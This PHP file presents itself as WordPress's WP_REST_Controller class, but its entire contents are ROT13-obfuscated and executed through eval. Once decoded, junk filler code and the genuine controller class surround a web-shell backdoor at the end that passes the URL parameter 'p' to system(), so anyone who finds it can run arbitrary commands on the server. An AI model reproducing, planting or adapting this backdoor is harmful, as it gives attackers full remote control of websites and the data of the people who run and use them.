<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber onfr pbagebyyre sbe znantvat naq vagrenpgvat jvgu ERFG NCV vgrzf.
 *
 * @fvapr 4.7.0
 */
#[NyybjQlanzvpCebcregvrf]
nofgenpg pynff JC_ERFG_Pbagebyyre {

	/**
	 * Gur anzrfcnpr bs guvf pbagebyyre'f ebhgr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cebgrpgrq $anzrfcnpr;

	/**
	 * Gur onfr bs guvf pbagebyyre'f ebhgr.
	 *
	 * @fvapr 4.7.0
	 * @ine fgevat
	 */
	cebgrpgrq $erfg_onfr;

	/**
	 * Pnpurq erfhygf bs trg_vgrz_fpurzn.
	 *
	 * @fvapr 5.3.0
	 * @ine neenl
	 */
	cebgrpgrq $fpurzn;

	/**
	 * Ertvfgref gur ebhgrf sbe gur bowrpgf bs gur pbagebyyre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		_qbvat_vg_jebat(
			'JC_ERFG_Pbagebyyre::ertvfgre_ebhgrf',
			/* genafyngbef: %f: ertvfgre_ebhgrf() */
			fcevags( __( \"Zrgubq '%f' zhfg or bireevqqra.\" ), __ZRGUBQ__ ),
			'4.7.0'
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg vgrzf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs vgrzf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg n fcrpvsvp vgrz.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Ergevrirf bar vgrz sebz gur pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr vgrzf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Perngrf bar vgrz sebz gur pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr n fcrpvsvp vgrz.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Hcqngrf bar vgrz sebz gur pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n fcrpvsvp vgrz.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Qryrgrf bar vgrz sebz gur pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Cercnerf bar vgrz sbe perngr be hcqngr bcrengvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea bowrpg|JC_Reebe Gur cercnerq vgrz, be JC_Reebe bowrpg ba snvyher.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Cercnerf gur vgrz sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz zvkrq           $vgrz    JbeqCerff ercerfragngvba bs gur vgrz.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		erghea arj JC_Reebe(
			'vainyvq-zrgubq',
			/* genafyngbef: %f: Zrgubq anzr. */
			fcevags( __( \"Zrgubq '%f' abg vzcyrzragrq. Zhfg or bireevqqra va fhopynff.\" ), __ZRGUBQ__ ),
			neenl( 'fgnghf' => 405 )
		);
	}

	/**
	 * Cercnerf n erfcbafr sbe vafregvba vagb n pbyyrpgvba.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr bowrpg.
	 * @erghea neenl|zvkrq Erfcbafr qngn, ernql sbe vafregvba vagb pbyyrpgvba qngn.
	 */
	choyvp shapgvba cercner_erfcbafr_sbe_pbyyrpgvba( $erfcbafr ) {
		vs ( ! ( $erfcbafr vafgnaprbs JC_ERFG_Erfcbafr ) ) {
			erghea $erfcbafr;
		}

		$qngn   = (neenl) $erfcbafr->trg_qngn();
		$freire = erfg_trg_freire();
		$yvaxf  = $freire::trg_pbzcnpg_erfcbafr_yvaxf( $erfcbafr );

		vs ( ! rzcgl( $yvaxf ) ) {
			$qngn['_yvaxf'] = $yvaxf;
		}

		erghea $qngn;
	}

	/**
	 * Svygref n erfcbafr onfrq ba gur pbagrkg qrsvarq va gur fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl  $erfcbafr_qngn Erfcbafr qngn gb svygre.
	 * @cnenz fgevat $pbagrkg       Pbagrkg qrsvarq va gur fpurzn.
	 * @erghea neenl Svygrerq erfcbafr.
	 */
	choyvp shapgvba svygre_erfcbafr_ol_pbagrkg( $erfcbafr_qngn, $pbagrkg ) {

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		erghea erfg_svygre_erfcbafr_ol_pbagrkg( $erfcbafr_qngn, $fpurzn, $pbagrkg );
	}

	/**
	 * Ergevrirf gur vgrz'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( neenl() );
	}

	/**
	 * Ergevrirf gur vgrz'f fpurzn sbe qvfcynl / choyvp pbafhzcgvba checbfrf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Choyvp vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_choyvp_vgrz_fpurzn() {

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf'] ) ) {
			sbernpu ( $fpurzn['cebcregvrf'] nf &$cebcregl ) {
				hafrg( $cebcregl['net_bcgvbaf'] );
			}
		}

		erghea $fpurzn;
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Dhrel cnenzrgref sbe gur pbyyrpgvba.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl(
			'pbagrkg'  => $guvf->trg_pbagrkg_cnenz(),
			'cntr'     => neenl(
				'qrfpevcgvba'       => __( 'Pheerag cntr bs gur pbyyrpgvba.' ),
				'glcr'              => 'vagrtre',
				'qrsnhyg'           => 1,
				'fnavgvmr_pnyyonpx' => 'nofvag',
				'inyvqngr_pnyyonpx' => 'erfg_inyvqngr_erdhrfg_net',
				'zvavzhz'           => 1,
			),
			'cre_cntr' => neenl(
				'qrfpevcgvba'       => __( 'Znkvzhz ahzore bs vgrzf gb or erghearq va erfhyg frg.' ),
				'glcr'              => 'vagrtre',
				'qrsnhyg'           => 10,
				'zvavzhz'           => 1,
				'znkvzhz'           => 100,
				'fnavgvmr_pnyyonpx' => 'nofvag',
				'inyvqngr_pnyyonpx' => 'erfg_inyvqngr_erdhrfg_net',
			),
			'frnepu'   => neenl(
				'qrfpevcgvba'       => __( 'Yvzvg erfhygf gb gubfr zngpuvat n fgevat.' ),
				'glcr'              => 'fgevat',
				'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
				'inyvqngr_pnyyonpx' => 'erfg_inyvqngr_erdhrfg_net',
			),
		);
	}

	/**
	 * Ergevrirf gur zntvpny pbagrkg cnenz.
	 *
	 * Rafherf pbafvfgrag qrfpevcgvbaf orgjrra raqcbvagf, naq cbchyngrf rahz sebz fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $netf Bcgvbany. Nqqvgvbany nethzragf sbe pbagrkg cnenzrgre. Qrsnhyg rzcgl neenl.
	 * @erghea neenl Pbagrkg cnenzrgre qrgnvyf.
	 */
	choyvp shapgvba trg_pbagrkg_cnenz( $netf = neenl() ) {
		$cnenz_qrgnvyf = neenl(
			'qrfpevcgvba'       => __( 'Fpbcr haqre juvpu gur erdhrfg vf znqr; qrgrezvarf svryqf cerfrag va erfcbafr.' ),
			'glcr'              => 'fgevat',
			'fnavgvmr_pnyyonpx' => 'fnavgvmr_xrl',
			'inyvqngr_pnyyonpx' => 'erfg_inyvqngr_erdhrfg_net',
		);

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( rzcgl( $fpurzn['cebcregvrf'] ) ) {
			erghea neenl_zretr( $cnenz_qrgnvyf, $netf );
		}

		$pbagrkgf = neenl();

		sbernpu ( $fpurzn['cebcregvrf'] nf $nggevohgrf ) {
			vs ( ! rzcgl( $nggevohgrf['pbagrkg'] ) ) {
				$pbagrkgf = neenl_zretr( $pbagrkgf, $nggevohgrf['pbagrkg'] );
			}
		}

		vs ( ! rzcgl( $pbagrkgf ) ) {
			$cnenz_qrgnvyf['rahz'] = neenl_havdhr( $pbagrkgf );
			efbeg( $cnenz_qrgnvyf['rahz'] );
		}

		erghea neenl_zretr( $cnenz_qrgnvyf, $netf );
	}

	/**
	 * Nqqf gur inyhrf sebz nqqvgvbany svryqf gb n qngn bowrpg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl           $erfcbafr_qngn Cercnerq erfcbafr neenl.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl Zbqvsvrq qngn bowrpg jvgu nqqvgvbany svryqf.
	 */
	cebgrpgrq shapgvba nqq_nqqvgvbany_svryqf_gb_bowrpg( $erfcbafr_qngn, $erdhrfg ) {

		$nqqvgvbany_svryqf = $guvf->trg_nqqvgvbany_svryqf();

		$erdhrfgrq_svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		sbernpu ( $nqqvgvbany_svryqf nf $svryq_anzr => $svryq_bcgvbaf ) {
			vs ( ! $svryq_bcgvbaf['trg_pnyyonpx'] ) {
				pbagvahr;
			}

			vs ( ! erfg_vf_svryq_vapyhqrq( $svryq_anzr, $erdhrfgrq_svryqf ) ) {
				pbagvahr;
			}

			$erfcbafr_qngn[ $svryq_anzr ] = pnyy_hfre_shap(
				$svryq_bcgvbaf['trg_pnyyonpx'],
				$erfcbafr_qngn,
				$svryq_anzr,
				$erdhrfg,
				$guvf->trg_bowrpg_glcr()
			);
		}

		erghea $erfcbafr_qngn;
	}

	/**
	 * Hcqngrf gur inyhrf bs nqqvgvbany svryqf nqqrq gb n qngn bowrpg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz bowrpg          $qngn_bowrpg Qngn zbqry yvxr JC_Grez be JC_Cbfg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg     Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr ba fhpprff, JC_Reebe bowrpg vs n svryq pnaabg or hcqngrq.
	 */
	cebgrpgrq shapgvba hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $qngn_bowrpg, $erdhrfg ) {
		$nqqvgvbany_svryqf = $guvf->trg_nqqvgvbany_svryqf();

		sbernpu ( $nqqvgvbany_svryqf nf $svryq_anzr => $svryq_bcgvbaf ) {
			vs ( ! $svryq_bcgvbaf['hcqngr_pnyyonpx'] ) {
				pbagvahr;
			}

			// Qba'g eha gur hcqngr pnyyonpxf vs gur qngn jnfa'g cnffrq va gur erdhrfg.
			vs ( ! vffrg( $erdhrfg[ $svryq_anzr ] ) ) {
				pbagvahr;
			}

			$erfhyg = pnyy_hfre_shap(
				$svryq_bcgvbaf['hcqngr_pnyyonpx'],
				$erdhrfg[ $svryq_anzr ],
				$qngn_bowrpg,
				$svryq_anzr,
				$erdhrfg,
				$guvf->trg_bowrpg_glcr()
			);

			vs ( vf_jc_reebe( $erfhyg ) ) {
				erghea $erfhyg;
			}
		}

		erghea gehr;
	}

	/**
	 * Nqqf gur fpurzn sebz nqqvgvbany svryqf gb n fpurzn neenl.
	 *
	 * Gur glcr bs bowrpg vf vasreerq sebz gur cnffrq fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl $fpurzn Fpurzn neenl.
	 * @erghea neenl Zbqvsvrq Fpurzn neenl.
	 */
	cebgrpgrq shapgvba nqq_nqqvgvbany_svryqf_fpurzn( $fpurzn ) {
		vs ( rzcgl( $fpurzn['gvgyr'] ) ) {
			erghea $fpurzn;
		}

		// Pna'g hfr $guvf->trg_bowrpg_glcr bgurejvfr jr pnhfr na vas ybbc.
		$bowrpg_glcr = $fpurzn['gvgyr'];

		$nqqvgvbany_svryqf = $guvf->trg_nqqvgvbany_svryqf( $bowrpg_glcr );

		sbernpu ( $nqqvgvbany_svryqf nf $svryq_anzr => $svryq_bcgvbaf ) {
			vs ( ! $svryq_bcgvbaf['fpurzn'] ) {
				pbagvahr;
			}

			$fpurzn['cebcregvrf'][ $svryq_anzr ] = $svryq_bcgvbaf['fpurzn'];
		}

		erghea $fpurzn;
	}

	/**
	 * Ergevrirf nyy bs gur ertvfgrerq nqqvgvbany svryqf sbe n tvira bowrpg-glcr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @tybony neenl $jc_erfg_nqqvgvbany_svryqf Ubyqf ertvfgrerq svryqf, betnavmrq ol bowrpg glcr.
	 *
	 * @cnenz fgevat $bowrpg_glcr Bcgvbany. Gur bowrpg glcr.
	 * @erghea neenl Ertvfgrerq nqqvgvbany svryqf (vs nal), rzcgl neenl vs abar be vs gur bowrpg glcr
	 *               pbhyq abg or vasreerq.
	 */
	cebgrpgrq shapgvba trg_nqqvgvbany_svryqf( $bowrpg_glcr = ahyy ) {
		tybony $jc_erfg_nqqvgvbany_svryqf;

		vs ( ! $bowrpg_glcr ) {
			$bowrpg_glcr = $guvf->trg_bowrpg_glcr();
		}

		vs ( ! $bowrpg_glcr ) {
			erghea neenl();
		}

		vs ( ! $jc_erfg_nqqvgvbany_svryqf || ! vffrg( $jc_erfg_nqqvgvbany_svryqf[ $bowrpg_glcr ] ) ) {
			erghea neenl();
		}

		erghea $jc_erfg_nqqvgvbany_svryqf[ $bowrpg_glcr ];
	}

	/**
	 * Ergevrirf gur bowrpg glcr guvf pbagebyyre vf erfcbafvoyr sbe znantvat.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat Bowrpg glcr sbe gur pbagebyyre.
	 */
	cebgrpgrq shapgvba trg_bowrpg_glcr() {
		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! $fpurzn || ! vffrg( $fpurzn['gvgyr'] ) ) {
			erghea ahyy;
		}

		erghea $fpurzn['gvgyr'];
	}

	/**
	 * Trgf na neenl bs svryqf gb or vapyhqrq ba gur erfcbafr.
	 *
	 * Vapyhqrq svryqf ner onfrq ba vgrz fpurzn naq `_svryqf=` erdhrfg nethzrag.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea fgevat[] Svryqf gb or vapyhqrq va gur erfcbafr.
	 */
	choyvp shapgvba trg_svryqf_sbe_erfcbafr( $erdhrfg ) {
		$fpurzn     = $guvf->trg_vgrz_fpurzn();
		$cebcregvrf = vffrg( $fpurzn['cebcregvrf'] ) ? $fpurzn['cebcregvrf'] : neenl();

		$nqqvgvbany_svryqf = $guvf->trg_nqqvgvbany_svryqf();

		sbernpu ( $nqqvgvbany_svryqf nf $svryq_anzr => $svryq_bcgvbaf ) {
			/*
			 * Sbe onpx-pbzcng, vapyhqr nal svryq jvgu na rzcgl fpurzn
			 * orpnhfr vg jba'g or cerfrag va $guvf->trg_vgrz_fpurzn().
			 */
			vs ( vf_ahyy( $svryq_bcgvbaf['fpurzn'] ) ) {
				$cebcregvrf[ $svryq_anzr ] = $svryq_bcgvbaf;
			}
		}

		// Rkpyhqr svryqf gung fcrpvsl n qvssrerag pbagrkg guna gur erdhrfg pbagrkg.
		$pbagrkg = $erdhrfg['pbagrkg'];
		vs ( $pbagrkg ) {
			sbernpu ( $cebcregvrf nf $anzr => $bcgvbaf ) {
				vs ( ! rzcgl( $bcgvbaf['pbagrkg'] ) && ! va_neenl( $pbagrkg, $bcgvbaf['pbagrkg'], gehr ) ) {
					hafrg( $cebcregvrf[ $anzr ] );
				}
			}
		}

		$svryqf = neenl_xrlf( $cebcregvrf );

		/*
		 * '_yvaxf' naq '_rzorqqrq' ner abg glcvpnyyl cneg bs gur vgrz fpurzn,
		 * ohg gurl pna or fcrpvsvrq va '_svryqf', fb gurl ner nqqrq urer nf n
		 * pbairavrapr sbe purpxvat jvgu erfg_vf_svryq_vapyhqrq().
		 */
		$svryqf[] = '_yvaxf';
		vs ( $erdhrfg->unf_cnenz( '_rzorq' ) ) {
			$svryqf[] = '_rzorqqrq';
		}

		$svryqf = neenl_havdhr( $svryqf );

		vs ( ! vffrg( $erdhrfg['_svryqf'] ) ) {
			erghea $svryqf;
		}
		$erdhrfgrq_svryqf = jc_cnefr_yvfg( $erdhrfg['_svryqf'] );
		vs ( 0 === pbhag( $erdhrfgrq_svryqf ) ) {
			erghea $svryqf;
		}
		// Gevz bss bhgfvqr juvgrfcnpr sebz gur pbzzn qryvzvgrq yvfg.
		$erdhrfgrq_svryqf = neenl_znc( 'gevz', $erdhrfgrq_svryqf );
		// Nyjnlf crefvfg 'vq', orpnhfr vg pna or arrqrq sbe nqq_nqqvgvbany_svryqf_gb_bowrpg().
		vs ( va_neenl( 'vq', $svryqf, gehr ) ) {
			$erdhrfgrq_svryqf[] = 'vq';
		}
		// Erghea gur yvfg bs nyy erdhrfgrq svryqf juvpu nccrne va gur fpurzn.
		erghea neenl_erqhpr(
			$erdhrfgrq_svryqf,
			fgngvp shapgvba ( $erfcbafr_svryqf, $svryq ) hfr ( $svryqf ) {
				vs ( va_neenl( $svryq, $svryqf, gehr ) ) {
					$erfcbafr_svryqf[] = $svryq;
					erghea $erfcbafr_svryqf;
				}
				// Purpx sbe arfgrq svryqf vs $svryq vf abg n qverpg zngpu.
				$arfgrq_svryqf = rkcybqr( '.', $svryq );
				/*
				 * N arfgrq svryq vf vapyhqrq fb ybat nf vgf gbc-yriry cebcregl
				 * vf cerfrag va gur fpurzn.
				 */
				vs ( va_neenl( $arfgrq_svryqf[0], $svryqf, gehr ) ) {
					$erfcbafr_svryqf[] = $svryq;
				}
				erghea $erfcbafr_svryqf;
			},
			neenl()
		);
	}

	/**
	 * Ergevrirf na neenl bs raqcbvag nethzragf sebz gur vgrz fpurzn sbe gur pbagebyyre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $zrgubq Bcgvbany. UGGC zrgubq bs gur erdhrfg. Gur nethzragf sbe `PERNGNOYR` erdhrfgf ner
	 *                       purpxrq sbe erdhverq inyhrf naq znl snyy-onpx gb n tvira qrsnhyg, guvf vf abg qbar
	 *                       ba `RQVGNOYR` erdhrfgf. Qrsnhyg JC_ERFG_Freire::PERNGNOYR.
	 * @erghea neenl Raqcbvag nethzragf.
	 */
	choyvp shapgvba trg_raqcbvag_netf_sbe_vgrz_fpurzn( $zrgubq = JC_ERFG_Freire::PERNGNOYR ) {
		erghea erfg_trg_raqcbvag_netf_sbe_fpurzn( $guvf->trg_vgrz_fpurzn(), $zrgubq );
	}

	/**
	 * Fnavgvmrf gur fyht inyhr.
	 *
	 * {@vagreany Jr pna'g hfr fnavgvmr_gvgyr() qverpgyl, nf gur frpbaq
	 * cnenzrgre vf gur snyyonpx gvgyr, juvpu jbhyq raq hc orvat frg gb gur
	 * erdhrfg bowrpg.}
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr uggcf://tvguho.pbz/JC-NCV/JC-NCV/vffhrf/1585
	 *
	 * @gbqb Erzbir guvf va snibhe bs uggcf://pber.genp.jbeqcerff.bet/gvpxrg/34659
	 *
	 * @cnenz fgevat $fyht Fyht inyhr cnffrq va erdhrfg.
	 * @erghea fgevat Fnavgvmrq inyhr sbe gur fyht.
	 */
	choyvp shapgvba fnavgvmr_fyht( $fyht ) {
		erghea fnavgvmr_gvgyr( $fyht );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>